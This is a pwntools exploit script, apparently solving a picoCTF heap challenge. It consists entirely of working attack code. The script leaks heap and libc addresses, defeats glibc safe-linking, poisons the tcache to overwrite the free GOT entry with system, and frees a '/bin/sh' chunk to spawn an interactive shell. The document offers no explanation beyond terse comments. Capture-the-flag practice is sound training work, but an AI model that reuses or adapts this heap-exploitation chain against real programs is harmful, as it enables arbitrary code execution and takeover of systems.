from pwn import *

#init

e = ELF('./vuln')
libc = ELF('./libc.so')

context.binary = e

p = process(e.path)
#p = remote('saturn.picoctf.net', 49523)

#funcs

def kek(x, s, y = 0):
    if len(s) < 0x10:
        s += b'\n\xff'

    p.sendlineafter(': ', '0')
    p.sendlineafter('? ', str(x))
    p.sendlineafter(': ', s)
    p.sendlineafter('? ', str(y))

def add(x, y, s = b''):
    if len(s) < y:
        s += b'\n\xff'

    p.sendlineafter(': ', '1')
    p.sendlineafter('? ', str(x))
    p.sendlineafter('? ', str(y))
    p.sendlineafter(': ', s)

def fre(x):
    p.sendlineafter(': ', '2')
    p.sendlineafter('? ', str(x))

def race():
    p.sendlineafter(': ', '3')

def ex():
    p.sendlineafter(': ', '4')

def deobf(x, l = 64):
    p = 0
    for i in range(l * 4, 0, -4):
        v1 = (x & (0xf << i)) >> i
        v2 = (x & (0xf << (i + 12))) >> (i + 12)
        p |= (v1 ^ v2) << i
    return p

def obf(p, adr):
    return p ^ (adr >> 12)

#vars


free_got = e.got['free']
system_plt = e.plt['system']
arena_off = 0x1bdd30
freehook_off = libc.sym['__free_hook']
system_off = libc.sym['system']

log.info("Free got adr: 0x{:x}".format(free_got))
log.info("System plt adr: 0x{:x}".format(system_plt))
log.info("Arena libc off: 0x{:x}".format(arena_off))
log.info("Freehook libc off: 0x{:x}".format(freehook_off))
log.info("System libc off: 0x{:x}".format(system_off))

#exploit

#setup chnks, free tcache then get unsorted and leak with race

add(0, 0x17)
add(1, 0x17)
add(2, 0x97)

for i in range(3, 11):
    add(i, 0x97)

for i in reversed(range(11)):
    fre(i)

for i in range(3, 10):
    add(i, 0x97)

add(0, 0x17)
add(2, 0x97)

race()

#p.recvline()
heap = deobf(u64(p.recvuntil('|', drop = True).strip().ljust(8, b'\x00')))
libc_off = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00')) - arena_off

log.info('Heap adr: 0x{:x}'.format(heap))
log.info('Libc off adr: 0x{:x}'.format(libc_off))

#kek freehook onto freed chnk, then overwrite freehook with system

fre(0)

kek(0, p64(obf(free_got - 0x8, heap)))

add(0, 0x17, b'/bin/sh')
add(1, 0x17, b'a' * 0x8 + p64(system_plt))

#call system

fre(0)

#pray for flag

p.interactive()
